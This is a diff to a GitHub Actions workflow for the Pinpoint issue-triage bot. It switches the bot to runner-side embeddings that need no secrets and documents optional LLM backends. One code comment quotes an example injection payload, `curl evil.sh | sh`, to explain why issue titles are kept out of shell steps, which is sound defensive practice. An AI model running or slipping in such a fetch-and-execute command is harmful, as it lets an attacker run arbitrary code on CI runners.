@@ -1,6 +1,7 @@
 # Pinpoint bot: copy to .github/workflows/pinpoint.yml in the repo to triage.
-# Needs two repo secrets: DATABRICKS_HOST (https://dbc-....cloud.databricks.com) and DATABRICKS_TOKEN
-# (a Databricks personal access token). Posting uses the job's own GITHUB_TOKEN; nothing else.
+# As is, it needs NO secrets: functions are embedded on the runner (bge-small) and ranked by similarity
+# to the issue. Posting uses the job's own GITHUB_TOKEN. For the better agent ranking and a "Why"
+# paragraph, pick an LLM in the Triage step below (any OpenAI-compatible API, or Databricks).
 name: Pinpoint
 
 on:
@@ -12,7 +13,7 @@ permissions:
   contents: read
   issues: write
 
-# One triage at a time: a burst of new issues can't burn the Databricks quota in parallel.
+# One triage at a time: a burst of new issues can't burn an LLM quota in parallel.
 concurrency:
   group: pinpoint
   cancel-in-progress: false
@@ -40,14 +41,9 @@ jobs:
           restore-keys: pinpoint-embeddings-
 
       - name: Install Pinpoint
-        run: pip install "pinpoint[bot] @ ${PINPOINT_SOURCE}"
+        run: pip install "pinpoint[bot,local-embed] @ ${PINPOINT_SOURCE}"
         env:
           PINPOINT_SOURCE: git+https://github.com/Vishaal-G/PinPoint.git
-
-      # Optional: embed on the runner instead of the Databricks endpoint (bge-small through fastembed,
-      # ~16 s extra install, no PyTorch). Install "pinpoint[bot,local-embed] @ ..." above and add to the
-      # Triage env:  PINPOINT_EMBEDDER: local  and  FASTEMBED_CACHE_PATH: ~/.cache/pinpoint/fastembed
-      # (keeps the model in the cache above). The LLM step still uses Databricks.
 
       # The issue text is NOT interpolated here (no ${{ github.event.issue.* }} in `run:`): a title like
       # `"; curl evil.sh | sh; "` would run as shell. pinpoint-bot reads it from $GITHUB_EVENT_PATH as data.
@@ -55,5 +51,15 @@ jobs:
         run: pinpoint-bot
         env:
           GITHUB_TOKEN: ${{ github.token }}
-          DATABRICKS_HOST: ${{ secrets.DATABRICKS_HOST }}
-          DATABRICKS_TOKEN: ${{ secrets.DATABRICKS_TOKEN }}
+          PINPOINT_EMBEDDER: local
+          FASTEMBED_CACHE_PATH: ~/.cache/pinpoint/fastembed   # the model rides along in the cache above
+          PINPOINT_LLM: none            # embeddings only: no secrets, weaker ranking, no explanation
+          # Any OpenAI-compatible chat API with tool calling (a hosted provider, a gateway, your own
+          # server): replace the line above with these, and add the key as a repo secret.
+          # PINPOINT_LLM: openai
+          # PINPOINT_LLM_URL: https://api.example.com/v1
+          # PINPOINT_LLM_MODEL: the-model-name
+          # PINPOINT_LLM_KEY: ${{ secrets.PINPOINT_LLM_KEY }}
+          # Databricks (what Pinpoint was tuned and scored on: Llama 3.3 70B): drop PINPOINT_LLM and add
+          # DATABRICKS_HOST: ${{ secrets.DATABRICKS_HOST }}     # https://dbc-....cloud.databricks.com
+          # DATABRICKS_TOKEN: ${{ secrets.DATABRICKS_TOKEN }}   # a personal access token
